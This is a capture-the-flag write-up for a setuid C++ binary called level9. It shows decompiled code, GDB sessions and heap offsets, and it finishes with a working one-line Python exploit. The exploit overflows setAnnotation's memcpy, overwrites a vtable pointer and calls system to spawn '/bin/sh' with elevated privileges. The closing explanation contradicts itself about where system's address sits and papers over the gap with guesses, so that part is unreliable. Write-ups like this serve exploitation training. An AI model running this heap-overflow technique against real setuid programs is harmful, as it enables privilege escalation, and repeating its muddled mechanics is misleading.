LEVEL_9:
# 📚 Exploiting level9
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9 </br>
The level9 binary is a C++ program that runs with privileges for bonus0, where a class N with a vtable (for virtual functions like operator+ and operator-).
The program takes a command-line argument (argv[1]) and processes it through a vulnerable function.

Main Function :
```
  void main(int param_1, int param_2) {
    N *this;
    N *this_00;
    if (param_1 < 2) {
      _exit(1);  // Exit if no argv[1]
    }
    this = (N *)operator_new(0x6c);  // Allocate first N object (108 bytes)
    N::N(this, 5);  // Initialize with value 5
    this_00 = (N *)operator_new(0x6c);  // Allocate second N object
    N::N(this_00, 6);  // Initialize with value 6
    N::setAnnotation(this, *(char **)(param_2 + 4));  // Copy argv[1]
    (*(code *)**(undefined4 **)this_00)(this_00, this);  // Call vtable function
    return;
  }
```
N Constructor :
```
  void __thiscall N::N(N *this, int param_1) {
    *(undefined ***)this = &PTR_operator__08048848;  // Set vtable
    *(int *)(this + 0x68) = param_1;  // Set value at offset 0x68
    return;
  }
```
setAnnotation:
```
  void __thiscall N::setAnnotation(N *this, char *param_1) {
    size_t __n = strlen(param_1);
    memcpy(this + 4, param_1, __n);  // Vulnerable copy
    return;
  }
```

Vtable Functions:
```
int __thiscall N::operator+(N *this, N *param_1) {
  return *(int *)(param_1 + 0x68) + *(int *)(this + 0x68);
}
int __thiscall N::operator-(N *this, N *param_1) 
```

Behavior:
  - Allocates two N objects of size 0x6c (108 bytes) on the heap.
  - Initializes this with value 5, this_00 with value 6, and both with vtable at 0x08048848.
  - Copies argv[1] into this + 4 using memcpy without bounds checking.
  - Calls a function from this_00’s vtable, passing this_00 and this.

## Vulnerability
The memcpy in setAnnotation copies argv[1] to this + 4 with length strlen(argv[1]), without checking if it fits within the first object’s 108 - 4 = 104 bytes of available space.
  - A long argv[1] overflows into the second object (this_00), starting at its heap metadata (~0x804a078).
  - Can overwrite this_00’s vtable pointer (~0x804a080), controlling the function called by (*(code *)this_00->vtable)(this_00, this).
```
Based on GDB and typical heap allocation :
(gdb) b *0x08048617
Breakpoint 1 at 0x8048617
(gdb) b *0x08048639
Breakpoint 2 at 0x8048639
(gdb) run TEST
Starting program: /home/user/level9/level9 TEST

Breakpoint 1, 0x08048617 in main ()
(gdb) si
0x08048530 in operator new ()
(gdb) finish
Run till exit from #0  0x08048530 in operator new ()
0x0804861c in main ()
(gdb) info registers eax
eax            0x804a008        134520840
(gdb) continue
Continuing.

Breakpoint 2, 0x08048639 in main ()
(gdb) si
0x08048530 in operator new ()
(gdb) finish
Run till exit from #0  0x08048530 in operator new ()
0x0804863e in main ()
(gdb) info registers
eax            0x804a078        134520952
ecx            0x20f21  134945
edx            0xb7eec440       -1209088960
ebx            0x804a008        134520840
esp            0xbffff700       0xbffff700
ebp            0xbffff728       0xbffff728
esi            0x0      0
edi            0x0      0
eip            0x804863e        0x804863e <main+74>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) set $A = 0x804a008
(gdb) set $B = 0x804a078
(gdb) p/d $B - ($A + 4)
$1 = 108
```
First Object (this):
```
  Starts at ~0x804a008 (heap chunk with metadata).
  Layout:
  0x804a008: [prev_size]
  0x804a00c: [size]
  0x804a010: [vtable = 0x08048848]
  0x804a014: [setAnnotation data]
  ...
  0x804a078: [value = 5]
```
Second Object (this_00):
```
  Starts at ~0x804a078 (0x804a010 + 0x6c).
  Layout:
  text0x804a078: [prev_size]
  0x804a07c: [size]
  0x804a080: [vtable = 0x08048848]
  ...
  0x804a0e4: [value = 6]
```

Key Offsets (from setAnnotation start at 0x804a014):
```
To this_00 start (0x804a078): 0x804a078 - 0x804a014 = 100 bytes.
To this_00->vtable (0x804a080): 108 bytes.
To this_00->vtable + 4 (0x804a084): 112 bytes.
```

Use setAnnotation’s memcpy to overwrite the vtable pointer at 0x804a080.</br>
Set it to point to a heap address (0x0804a00c) that contains the address of system (0xb7d86060).
Place "/bin/sh" nearby (0x804a084) to serve as the argument to system.

### Payload Construction

Total Length: 4 + 104 + 4 + 8 = 120 bytes (ensures memcpy copies all data, as strlen stops at null bytes).

Components:
```
Address of system : 0xb7d86060.
"\xb7\xd8\x60\x60" (big-endian, incorrect).
"\x60\x60\xd8\xb7" (little-endian, correct for x86).
Written to 0x804a014 (start of setAnnotation).

+
NOPS : "\x90" * 104:
104 NOP bytes (0x90, no operation).
Fills from 0x804a018 to 0x804a07f, covering the first object and reaching this_00’s metadata.

+
Heap address: 0x0804a00c (heap metadata, likely size field).
Reversed: "\x0c\xa0\x04\x08".
Written to 0x804a080 (vtable pointer of this_00).

+
";/bin/sh":

8 bytes: semicolon (ignored) + "/bin/sh" + null terminator.
Written to 0x804a084 onward.

0x804a014: 0xb7d86060  # system
0x804a018: \x90\x90...  # 104 NOPs
0x804a080: 0x0804a00c  # vtable -> heap metadata
0x804a084: ;/bin/sh
```
The exploit command:

> ./level9 $(python -c 'print "\x60\x60\xd8\xb7" + "\x90" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh"') 

How the Exploit Works

Step-by-Step Execution:

Allocation:

this allocated at ~0x804a008, this_00 at ~0x804a078.


setAnnotation:

memcpy(this + 4, payload, strlen(payload)) copies 120 bytes to 0x804a014.
Overwrites:

0x804a014: system address (0xb7d86060).
0x804a080: Vtable pointer to 0x0804a00c.
0x804a084: ";/bin/sh".




Vtable Call:

(*(code *)this_00->vtable)(this_00, this).
this_00->vtable (0x804a080) = 0x0804a00c.
*(0x0804a00c) = 0xb7d86060 (from payload at 0x804a014, possibly due to heap alignment or earlier overwrite).
Calls system(this_00, this), where this_00 = 0x804a078.


system Call:

this_00 (0x804a078) is close to ";/bin/sh" at 0x804a084.
system interprets nearby memory as "/bin/sh" (the semicolon is ignored).
Spawns a shell with bonus0 privileges.




Why 0x0804a00c?:

0x0804a00c is the heap chunk’s size field (metadata).
The payload places system (0xb7d86060) at 0x804a014, but the vtable points to 0x0804a00c.
Likely, heap metadata or an earlier overwrite ensures 0x0804a00c points to 0x804a014 (or nearby), containing system.
